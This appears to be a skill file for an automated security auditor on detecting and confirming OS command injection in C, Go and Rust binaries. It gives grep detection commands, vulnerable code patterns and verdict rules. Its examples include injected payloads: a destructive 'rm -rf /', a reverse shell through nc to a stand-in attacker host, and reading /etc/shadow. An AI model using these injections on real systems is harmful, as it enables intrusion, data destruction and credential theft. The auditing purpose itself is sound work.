---
name: binary-command-injection
description: OS command injection in native binary contexts — system(), popen(), exec(), Go exec.Command, Rust Command::new. CWE-78.
---

# Binary Command Injection (CWE-78)

Command injection in compiled binaries follows the same root cause as in web apps — user-controlled input reaches an OS command execution primitive without sanitisation — but the entry points differ: CLI arguments, environment variables, config files, network messages, and IPC pipes rather than HTTP forms. The impact is identical: full shell access with the process's privileges.

## Where to Look

**C/C++ execution primitives:**
- `system(cmd)` — passes `cmd` to `/bin/sh -c`; any shell metachar is interpreted
- `popen(cmd, mode)` — same shell interpretation as `system`
- `execve("/bin/sh", {"sh", "-c", cmd, NULL}, ...)` — explicit shell invocation
- `execl("/bin/sh", "sh", "-c", cmd, 0)` — same
- `execlp("sh", "sh", "-c", cmd, 0)`
- `execvp(argv[0], argv)` where `argv[0]` is derived from user input (arbitrary binary execution)

**Go execution:**
- `exec.Command("sh", "-c", cmd)` where `cmd` includes user input — shell metachar injection
- `exec.Command(userInput, ...)` — arbitrary command execution if first arg is user-controlled

**Rust execution:**
- `Command::new("sh").arg("-c").arg(user_input).output()` — shell injection
- `Command::new(user_input).output()` — arbitrary execution

**Python subprocess (in binaries with embedded Python):**
- `subprocess.call(user_input, shell=True)`
- `os.system(user_input)`
- `os.popen(user_input)`

## How to Detect

### Static grep (C/C++)

```bash
docker exec <container> sh -c "
  grep -rn 'system\s*(\|popen\s*(\|execl\b\|execv\b\|execvp\b\|execlp\b' \
    --include='*.c' --include='*.cpp' /app 2>/dev/null | head -40
"
```

**Detect shell `-c` invocations specifically:**
```bash
docker exec <container> sh -c "
  grep -rn '\"sh\"\|\"bash\"\|\"cmd\"\|\"cmd.exe\"' \
    --include='*.c' --include='*.cpp' /app 2>/dev/null \
  | grep -E 'exec|system|popen' | head -20
"
```

### Static grep (Go)

```bash
docker exec <container> sh -c "
  grep -rn 'exec\.Command\|exec\.CommandContext' \
    --include='*.go' /app 2>/dev/null | head -40
"
```
For each hit, examine: is the first argument `\"sh\"` or `\"bash\"` with `-c` as the second? If the third argument contains a variable derived from input — CONFIRMED injection. If the first argument itself is a variable — CONFIRMED arbitrary execution.

### Static grep (Rust)

```bash
docker exec <container> sh -c "
  grep -rn 'Command::new\|process::Command' \
    --include='*.rs' /app 2>/dev/null | head -30
"
```

### Taint trace

1. Identify input sources: `argv[]`, `getenv()`, config file parse result, `recv()`/`read()`, stdin readline
2. Follow to string construction — look for `snprintf(cmd, ...)`, `strcat(cmd, user_input)`, or Go `fmt.Sprintf("... %s ...", userInput)`
3. Check if the constructed string reaches `system()`/`popen()`/`exec.Command("sh","-c",...)` 
4. Confirm there is no shell metachar sanitisation (removing `;`, `|`, `&`, `` ` ``, `$(`, `>`, `<`, `\n`)

## Vulnerability Patterns

### C: string concatenation into system()

```c
char cmd[512];
snprintf(cmd, sizeof(cmd), "convert %s output.png", filename);  // filename from user
system(cmd);  // user sends "input.jpg; rm -rf /" → executed by /bin/sh
```

### C: popen with user-controlled path

```c
char buf[256];
snprintf(buf, sizeof(buf), "file -b %s", user_path);
FILE *fp = popen(buf, "r");  // user_path = "/etc/passwd; nc -e /bin/sh attacker 4444"
```

### Go: exec.Command with shell -c

```go
func runScript(scriptName string) {
    // scriptName from HTTP param or config
    cmd := exec.Command("sh", "-c", "run_scripts/"+scriptName)
    cmd.Run()
}
// scriptName = "../evil; id > /tmp/pwned" → executes arbitrary commands
```

**Safe Go pattern** — pass arguments as separate elements, never through shell:
```go
cmd := exec.Command("/usr/bin/convert", userFile, "output.png")  // no shell, no injection
```

### Go: first-arg injection

```go
tool := r.FormValue("tool")  // e.g. "identify" — intended; "sh" — attacker's input
cmd := exec.Command(tool, args...)  // executes arbitrary binary
```

### Rust: shell=true equivalent

```rust
let output = Command::new("sh")
    .arg("-c")
    .arg(format!("process {}", user_input))  // user_input = "x; cat /etc/shadow"
    .output()?;
```

## Exploitation

```bash
# CLI arg injection
docker exec <container> sh -c "./<binary> 'input; id > /tmp/rce_proof'"
docker exec <container> sh -c "cat /tmp/rce_proof"
# Expected: uid=... output — confirms command injection

# Network-triggered (if binary is a daemon):
docker exec <container> sh -c "
  echo 'filename=test.jpg;id>/tmp/rce_proof' | nc 127.0.0.1 <port>
  cat /tmp/rce_proof
"

# Go binary example
docker exec <container> sh -c "./<binary> --input 'x; whoami > /tmp/rce_proof'"
```

## Judge Verdicts

**CONFIRMED:** `system(cmd)` / `popen(cmd, ...)` / `exec.Command("sh", "-c", s)` where `cmd`/`s` contains a variable that originates from external input without shell metachar stripping.

**CONFIRMED:** `exec.Command(userInput, ...)` or `execvp(userInput, ...)` where the binary path is user-controlled.

**LIKELY:** Command string built from user input with a partial sanitisation that only strips some metacharacters (e.g., removes `;` but not `$(...)` or newline).

**NEEDS CONTEXT:** `exec.Command(fixedBinary, userArg)` without shell — safe from injection unless `fixedBinary` is `sh`/`bash` with `-c`.

**FALSE POSITIVE:** `exec.Command("/usr/bin/convert", file1, file2)` where all arguments are separate tokens and none is passed through a shell — shell metacharacters in arguments are not interpreted.
